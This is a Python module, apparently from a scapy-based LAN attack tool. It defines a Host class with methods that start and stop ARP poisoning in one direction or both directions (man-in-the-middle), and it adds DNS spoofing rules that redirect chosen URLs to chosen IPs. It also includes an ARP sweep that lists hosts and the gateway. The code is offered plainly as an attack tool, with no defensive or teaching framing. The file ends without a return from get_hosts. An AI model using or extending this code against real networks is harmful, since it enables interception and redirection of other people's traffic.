from scapy.all import *

from arp_poisoning import ArpPoisoner
from dns_poisoning import DnsPoisoner


class Host():

    def __init__(self, ip, mac, interface, dns_queue_num):

        self.ip           = ip
        self.mac          = mac
        self.is_gateway   = ip[-2:] == ".1"
        self.arp_poisoner = ArpPoisoner(interface)
        self.dns_poisoner = DnsPoisoner(ip, dns_queue_num)

    def arp_oneway(self, other_ip, other_mac):

        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)

    def arp_mitm(self, other_ip, other_mac):

        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
        self.arp_poisoner.add_packet(self.mac, other_mac, self.ip, other_ip)

    def arp_start(self):

        self.arp_poisoner.start()

    def arp_stop(self):

        self.arp_poisoner.stop()

    def dns_add(self, url, ip):

        self.dns_poisoner.add_url(url, ip)

    def dns_start(self):

        self.dns_poisoner.start()

    def dns_stop(self):

        self.dns_poisoner.stop()


def get_hosts(interface, range_, timeout):

    gateway = None
    hosts   = []
    packet  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range_)

    for (request, answer) in srp(packet, timeout=timeout, interface=interface)[0]:

        if answer.psrc[-2:] == ".1":
            gateway = Host(answer.psrc, answer.mac, interface, 0)
        else:
            hosts.append(Host(answer.psrc, answer.mac, interface, 2*(len(hosts) + 1) ))

